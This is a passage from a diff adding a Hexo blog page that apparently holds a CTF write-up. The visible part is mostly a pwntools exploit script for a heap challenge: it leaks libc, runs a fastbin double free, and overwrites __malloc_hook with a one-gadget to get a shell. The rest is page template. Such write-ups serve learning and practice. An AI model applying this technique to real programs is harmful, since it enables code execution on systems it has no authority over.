class="string">b&#x27;Length of the name :&#x27;</span>,<span class="built_in">str</span>(name_size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;The name of flower :&#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">b&#x27;The color of the flower :&#x27;</span>,color)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Which flower do you want to remove from the garden:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x450</span>,<span class="string">b&#x27;bbb&#x27;</span>,<span class="string">b&#x27;bbb&#x27;</span>) <span class="comment">#idx 0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;ddd&#x27;</span>,<span class="string">b&#x27;ddd&#x27;</span>) <span class="comment">#idx 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">clean()</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x450</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">rcu(<span class="string">b&#x27;flower[0] :&#x27;</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;aaaaaaa\n&#x27;</span>)</span><br><span class="line">leaklibc = u64(rcl().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = leaklibc - <span class="number">0x3c3b78</span></span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAKLIBC&#x27;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBCBASE&#x27;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">libc_malloc_hook = libcbase + <span class="number">0x3c3b10</span></span><br><span class="line">libc_system = libcbase + <span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fakechunk = libc_malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;AAA&#x27;</span>,<span class="string">b&#x27;AAA&#x27;</span>) <span class="comment">#idx 2</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;BBB&#x27;</span>,<span class="string">b&#x27;BBB&#x27;</span>) <span class="comment">#idx 3</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;ttt&#x27;</span>,<span class="string">b&#x27;ttt&#x27;</span>) <span class="comment">#idx 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin : chunk2 -&gt; chunk3 -&gt; chunk 2 -&gt; ...</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">onegadget = libcbase + <span class="number">0xef6c4</span> </span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,p64(fakechunk),<span class="string">b&#x27;CCC&#x27;</span>) <span class="comment"># chunk 3 -&gt; chunk 2 -&gt; mallochook - 0xb</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;DDD&#x27;</span>,<span class="string">b&#x27;DDD&#x27;</span>) <span class="comment"># get chunk 3</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;EEE&#x27;</span>,<span class="string">b&#x27;EEE&#x27;</span>) <span class="comment"># get chunk 2</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span>+p64(onegadget) ,<span class="string">b&#x27;P&#x27;</span>) <span class="comment"># get malloc hook - 0xb</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&#x27;MALLOC HOOK&#x27;</span>,<span class="built_in">hex</span>(libc_malloc_hook))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBC SYSTEM&#x27;</span>,<span class="built_in">hex</span>(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>沒想到之前在 house of roman的梗會在這裡用到</p>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/09/20/Pwnable-seethefile/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
